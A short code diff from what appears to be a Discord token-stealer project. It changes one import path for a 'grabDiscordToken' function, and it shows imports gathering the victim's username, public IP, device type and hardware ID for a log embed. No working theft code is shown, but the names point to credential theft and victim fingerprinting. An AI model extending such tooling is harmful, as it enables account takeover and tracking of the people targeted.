@@ -6,7 +6,7 @@ import { getLocalUsername } from '@/bot/functions/check_user'
 import { getPublicIP } from '@/bot/functions/ip'
 import { getDeviceType } from '@/bot/functions/device'
 import { getHWID } from '@/bot/functions/hwid'
-import { grabDiscordToken } from '../functions/grab_token'
+import { grabDiscordToken } from '@/bot/functions/grab_token'
 
 export const createLogEmbed = async (client: Client): Promise<EmbedBuilder> => {
   const publicIp = await getPublicIP()
